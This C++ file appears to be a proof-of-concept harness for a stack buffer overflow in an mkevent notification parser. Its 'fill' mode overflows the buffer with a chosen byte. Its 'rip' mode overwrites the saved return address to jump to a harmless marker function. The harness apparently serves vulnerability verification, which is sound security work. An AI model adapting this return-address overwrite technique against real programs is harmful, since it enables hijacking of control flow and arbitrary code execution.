#define main mkevent_program_main
#include MKEVENT_SOURCE
#undef main

#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <iostream>
#include <string>
#include <string_view>
#include <vector>

__attribute__((noinline)) static void benign_marker() {
    std::fputs("BENIGN_MARKER\n", stdout);
    std::fflush(stdout);
    _exit(0);
}

// The real parse_notification() reaches this verbatim append_str() sink after
// a 44-byte header for the fixed arguments below. This isolated wrapper removes
// unrelated C++ return-object locals so the saved-RIP primitive is measurable.
__attribute__((noinline)) static void direct_sink(std::string_view text) {
    char message[8192];
    append_str(text, message + 44);
}

int main(int argc, char **argv) {
    if (argc < 3) {
        std::cerr << "usage: direct fill LENGTH [BYTE] | rip OFFSET\n";
        return 64;
    }
    std::vector<char> text;
    if (std::strcmp(argv[1], "fill") == 0) {
        const std::size_t length = std::strtoull(argv[2], nullptr, 10);
        const int byte = argc > 3 ? std::strtol(argv[3], nullptr, 0) : 0x43;
        text.assign(length, static_cast<char>(byte));
        text.push_back('\0');
    } else if (std::strcmp(argv[1], "rip") == 0) {
        const std::size_t offset = std::strtoull(argv[2], nullptr, 10);
        const std::uintptr_t target = reinterpret_cast<std::uintptr_t>(&benign_marker);
        std::fprintf(stderr, "MARKER_ADDRESS=%p\n", reinterpret_cast<void *>(&benign_marker));
        text.assign(offset, 'A');
        for (unsigned i = 0; i < 3; ++i) {
            const unsigned char byte = (target >> (8 * i)) & 0xff;
            if (byte == 0) {
                std::cerr << "marker low bytes contain NUL; choose another build\n";
                return 65;
            }
            text.push_back(static_cast<char>(byte));
        }
        text.push_back('\0');
    } else {
        std::cerr << "unknown mode\n";
        return 64;
    }
    direct_sink(std::string_view(text.data(), text.size() - 1));
    return 0;
}
